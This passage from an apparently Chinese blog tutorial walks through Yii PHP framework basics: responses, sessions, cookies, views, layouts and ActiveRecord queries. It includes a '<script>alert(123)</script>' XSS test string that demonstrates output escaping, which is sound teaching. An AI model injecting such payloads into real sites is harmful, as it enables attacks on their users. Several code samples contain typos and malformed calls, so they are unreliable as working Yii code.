class="comment">//当没有进行get时 默认为20</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k7c6dvkcj30ey063aa5.jpg" alt=""></p><p>同样也可以 $request-&gt;post(‘id’,20);进行post</p><h3 id="YII操作HTTP"><a href="#YII操作HTTP" class="headerlink" title="YII操作HTTP"></a>YII操作HTTP</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// $request = \YII::$app-&gt;request;//全局类</span></span></span><br><span class="line"><span class="php">    <span class="comment">// echo $request-&gt;get('id',20); //当没有进行get时 默认为20</span></span></span><br><span class="line"><span class="php">    $res =  \YII::$app-&gt;response;</span></span><br><span class="line"><span class="php">    <span class="comment">// 添加头部信息</span></span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;add(<span class="string">'pragma'</span>,<span class="string">'no-cache'</span>);</span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;set(<span class="string">'pragma'</span>,<span class="string">'no-cache'</span>);</span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;remove(<span class="string">'pragma'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// 实现跳转</span></span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;add(<span class="string">'location'</span>,<span class="string">'http://www.baidu.com'</span>);</span></span><br><span class="line"><span class="php">    <span class="comment">// 有专门跳转方法</span></span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;redirect(<span class="string">'htttp://wwww.baidu.com'</span>,<span class="number">302</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//进行文件下载</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 访问文件默认在 WEB目录下</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;add(<span class="string">'content-dispostion'</span>,<span class="string">'attachment; filename="a.jpg"'</span>)</span></span><br><span class="line"><span class="php">    $res-&gt;sendFile(<span class="string">'./robots.txt'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="YII-操作Session"><a href="#YII-操作Session" class="headerlink" title="YII 操作Session"></a>YII 操作Session</h3><p>session 的存储路径可在 php.ini 中找到</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $session = \YII::$app-&gt;session;</span></span><br><span class="line"><span class="php">    $session-&gt;open();   <span class="comment">//用于开启session</span></span></span><br><span class="line"><span class="php">    <span class="comment">// if($session-&gt;isActive)&#123;  //用于检测 session 是否开启</span></span></span><br><span class="line"><span class="php">    <span class="comment">//   echo "session is active";</span></span></span><br><span class="line"><span class="php">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $session-&gt;set(<span class="string">'user'</span>,<span class="string">'夏利'</span>);   <span class="comment">//用于设置 session</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0l8xjhx9jj311b0ekdhe.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> $session-&gt;get(<span class="string">'user'</span>);  <span class="comment">// 获得session值</span></span><br><span class="line"></span><br><span class="line">$session-&gt;remove(<span class="string">'user'</span>);</span><br><span class="line"></span><br><span class="line">$session[<span class="string">'user'</span>] = <span class="string">'张三'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>($session[<span class="string">'user'</span>]);</span><br></pre></td></tr></table></figure><h3 id="YII-操作Cookie"><a href="#YII-操作Cookie" class="headerlink" title="YII 操作Cookie"></a>YII 操作Cookie</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $cookies = \YII::$app-&gt;response-&gt;cookies;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $cookie_data = <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;<span class="string">'user'</span>,<span class="string">'value'</span>=&gt;<span class="string">'zhangsi'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $cookies-&gt;add(<span class="keyword">new</span> cookie($cookie_data));</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="View-层"><a href="#View-层" class="headerlink" title="View 层"></a>View 层</h2><p>要访问视图文件  需要把视图文件放到与控制器名相同的文件夹下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;renderPartial(<span class="string">'index'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>.\basic\views\Hello.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;小姐姐&lt;/h1&gt;"</span>;</span></span><br></pre></td></tr></table></figure><p>访问<a href="http://127.0.0.1/basic/web/index.php?r=hello/index" target="_blank" rel="noopener">http://127.0.0.1/basic/web/index.php?r=hello/index</a><br>成功得到视图文件</p><p>当要在view文件中使用控制器中的的变量时  需要把数据放入数组当中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $hello_str = <span class="string">'小哥哥'</span>;</span></span><br><span class="line"><span class="php">    $test_array = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//创建一个数组 存放数据</span></span></span><br><span class="line"><span class="php">    $array = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// 将数据放入数组</span></span></span><br><span class="line"><span class="php">    $data[<span class="string">'view_str'</span>] = $hello_str;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $data[<span class="string">'view_array'</span>] = $tset_array;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;renderPartial(<span class="string">'index'</span>,$data);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_str;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_array[<span class="number">0</span>];<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当$hello_str  可控 会造成恶意代码攻击  可以使用两个方法进行过滤</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$hello_str = '小姐姐<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(123)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">Html</span>;  <span class="comment">// 这个类会将script 转移</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">HtmlPurifier</span>;   <span class="comment">//这个类会将script 直接过滤掉</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=Html::encode($view_str);<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=HtmlPurifier::process($view_str);<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lbuqssloj30kt06eq33.jpg" alt=""></p><p>优化布局<br>当在hello文件夹中有about.php index.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    hello about</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    hello index</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可见 除了 hello about hello index 其他的都显得 多余<br>接下来把 多余的代码 放在basic\views\layouts 文件夹下 并创建一个common.php<br>内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello common<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="php"><span class="meta">&lt;?</span>=$content;<span class="meta">?&gt;</span></span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>index.php和about.php直接写hello index  hello about</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $layout = <span class="string">'common'</span>;  <span class="comment">//指定模板</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">      <span class="comment">// 调用render方法</span></span></span><br><span class="line"><span class="php">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'index'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br></pre></td></tr></table></figure><p>访问<a href="http://127.0.0.1/basic/web/index.php?r=hello/index" target="_blank" rel="noopener">http://127.0.0.1/basic/web/index.php?r=hello/index</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lcgg7rg2j30dm04xjr9.jpg" alt=""></p><p>如果想在index.php视图访问about.php视图文件<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lcp2erquj30qv0ba3zf.jpg" alt=""></p><p>如果访问另一个视图文件的变量<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lcyp5qtaj30yw0dmgnb.jpg" alt=""><br>YI操作数据块<br>当不想显示模板中的一些内容时 用<br>$this-&gt;endBlock();<br>来定义一个html代码块，该代码块可在layout文件中引用，<br>$this-&gt;blocks[‘block_name’]</p><h2 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h2><h3 id="YII-数据模型"><a href="#YII-数据模型" class="headerlink" title="YII 数据模型"></a>YII 数据模型</h3><p>对数据库进行增删改查操作数据库<br>实现创建数据库yii 表test  tittle id 字段</p><p>在config文件夹中的db.php配置好数据库</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php">usw app\models\Test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloControllers</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $sql = <span class="string">'select * from test where id=:id'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// 首先产生的每一条记录被放在一个对象里面 每一个对象被放在数组里面</span></span></span><br><span class="line"><span class="php">    $results = Test::findBySql($sql,<span class="keyword">array</span>(<span class="string">':id'</span>=&gt;<span class="number">1</span>))-&gt;all();    <span class="comment">// 利用占位符 可以防止sql注入 无论拼接的是什么 都会当成一个字符</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>但是这样看起来代码有点多  可以用find()方法  将查询条件放到数据中去</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php">usw app\models\Test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloControllers</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// $sql = 'select * from test where id=:id';</span></span></span><br><span class="line"><span class="php">    <span class="comment">//</span></span></span><br><span class="line"><span class="php">    <span class="comment">// // 首先产生的每一条记录被放在一个对象里面 每一个对象被放在数组里面</span></span></span><br><span class="line"><span class="php">    <span class="comment">// $results = Test::findBySql($sql,array(':id'=&gt;1))-&gt;all();    // 利用占位符 可以防止sql注入 无论拼接的是什么 都会当成一个字符</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $results = Test::find()-&gt;where([<span class="string">'id'</span>]=&gt;<span class="number">1</span>)-&gt;all();</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这样就显得简洁多了<br>如果要查询id&gt;0 的话就要用第三个参数</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'&gt;'</span>,<span class="string">'id'</span>,<span class="string">'0'</span>])</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure><p>查询id&gt;=1  id&lt;=2</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'between'</span>,<span class="string">'id'</span>,<span class="number">1</span>,<span class="number">2</span>])</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure><p>like 操作  </p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'linke'</span>,<span class="string">'title'</span>,<span class="string">'title'</span>])</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure><p>用asArray 可以降低农村使用量和使代码，数据清晰</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'linke'</span>,<span class="string">'title'</span>,<span class="string">'title'</span>])</span>-&gt;</span>asArray<span class="function"><span 